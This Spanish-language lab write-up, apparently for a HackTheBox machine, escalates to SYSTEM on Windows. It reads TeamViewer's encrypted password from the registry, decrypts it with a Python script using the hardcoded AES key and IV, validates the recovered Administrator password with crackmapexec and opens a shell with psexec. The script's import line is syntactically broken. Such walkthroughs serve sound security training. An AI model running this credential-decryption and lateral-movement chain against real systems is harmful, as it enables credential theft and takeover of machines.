## Privilege Escalation {-}

### Rootear la maquina {-}

```powershell
whoami
systeminfo
whoami /priv
```

Aqui vemos que tenemos privilegios SeImpersonatePrivilege. Podriamos tratar de utilizar el JuicyPotato pero en este caso vamos a hacerlo de otra forma.
Si hacemos 

```powershell
tasklist
```

Vemos que hay un **TeamViewer_Service.exe**. 

```bash
locate teamviewer | grep "metasploit"
cat /usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb
```

Como no vamos a utilizar metasploit nos creamos un script en python, pero primero miramos el script y recuperamos la version y la contraseña cifrada.

```powershell
cd C:\
cd PROGR~1
dir
cd PROGR~2
dir
cd TeamViewer
dir
#Output Version7

cd HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7
Get-itemproperty -Path .
(Get-itemproperty -Path .).SecurityPasswordAES
```

Aqui ya tenemos el cifrado de la contraseña. La copiamos y la modificamos para poder usarla desde el script de python

```bash
echo "255
155
28
115
214
107
206
49
172
65
62
174
19
27
78
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91" | xargs | sed 's/ /, /g' | tr -d '\n' | xclip -sel clip
```

y creamos nuestro script

```python
#!/usr/bin/python3
from Crypto.Cipher = AES

key = b'\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00'
IV = b'\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xf2\x5e\xa8\xd7\x04'

decipher = AES.new(key, AES.MODE_CBC, IV)
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 78, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

plaintext = decipher.decrypt(ciphertext).decode()
print(plaintext)
```

Lanzamos el script y tenemos la contraseña del teamviewer.

contraseña encontrada es contraseña que tenemos que verificar.

```bash
crackmapexec smb 10.10.10.180 -u 'Administrator' -p '!R3m0te!'
```

Nos da un **(Pwn3d!)**.

Nos connectamos con psexec

```bash
psexec.py WORKGROUP/Administrator@10.10.10.180 cmd.exe
password: !R3m0te!

whoami nt authority\system
```

Ya somos administrador y podemos ver la flag.
